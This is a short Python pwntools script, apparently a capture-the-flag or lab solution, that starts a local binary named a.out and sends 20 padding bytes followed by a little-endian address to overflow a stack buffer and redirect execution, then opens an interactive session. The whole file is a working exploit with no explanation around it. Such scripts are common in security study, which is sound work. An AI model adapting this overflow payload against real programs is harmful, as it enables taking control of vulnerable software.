from pwn import *

if __name__ == '__main__':
    io = process('./a.out')
    io.recv()
    io.send(b'12345678901234567890\xba\x91\x04\x08')
    io.interactive()